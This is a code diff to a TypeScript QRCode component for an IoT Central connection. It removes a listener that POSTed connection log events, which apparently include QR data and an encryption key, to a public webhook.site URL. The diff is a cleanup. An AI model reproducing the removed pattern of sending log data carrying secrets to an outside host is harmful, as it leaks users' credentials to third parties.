@@ -57,20 +57,7 @@ function QRCode(props: { onSuccess?(): void | Promise<void> }) {
         showPrompt(true);
     }
 
-    const logConnection = (item: LogItem) => {
-        setLoadingMsg(item.eventData);
-        fetch('https://webhook.site/6b40aeec-0a58-45ee-87b6-132fcf9a1471', {
-            method: 'POST',
-            body: `${item.eventName}:${item.eventData}`,
-            headers: {
-                'ContentType': 'text/plain'
-            }
-        });
-        console.log(`${item.eventName}:${item.eventData}`);
-    }
-
     const connectIoTC = async function () {
-        addListener(LOG_DATA, logConnection);
         if (qrdata && encKey) {
             Log(qrdata);
             Log(encKey);
@@ -93,12 +80,10 @@ function QRCode(props: { onSuccess?(): void | Promise<void> }) {
         if (client && client.isConnected() && loading) {
             setLoading(false);
             showPrompt(false);
-            removeListener(LOG_DATA, logConnection);
             if (props.onSuccess) {
                 props.onSuccess();
             }
         }
-        return () => removeListener(LOG_DATA, logConnection);
     }, [client, loading])
 
     return (
